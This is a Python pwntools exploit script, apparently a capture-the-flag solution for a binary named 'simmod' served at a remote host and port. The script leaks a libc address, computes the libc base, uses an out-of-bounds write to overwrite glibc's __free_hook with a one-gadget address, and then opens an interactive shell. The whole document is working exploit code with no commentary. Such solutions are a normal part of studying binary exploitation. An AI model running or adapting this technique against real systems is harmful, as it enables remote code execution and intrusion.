#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'mc.ax', 31547
binary = './simmod'

elf = ELF("simmod")
libc = ELF("libc.so.6")

brkpts = '''
b main
c
watch *{}
b free
c
'''.format(0x7ffff7e0e000+libc.symbols['__free_hook'])

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    # io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc.so.6'})

if __name__ == "__main__":
    sla("big?\n", "10000000")
    reu("you are here: ")
    leak = int(re(14), 16)
    libc.address = leak + 0x989ff0
    log.info("libc @ "+hex(libc.address))
    gadget = libc.address + 0x448a3
    log.info("gadget @ "+hex(gadget))
    # addr = libc.symbols['__free_hook']
    addr1 = libc.symbols['__free_hook']
    addr2 = gadget

    # gdb.attach(io, brkpts)
    sla("far?\n", str((addr1 - leak)/8))
    sla("what?\n", '0'*0x100000+str(gadget)+"\x00")

    io.interactive()
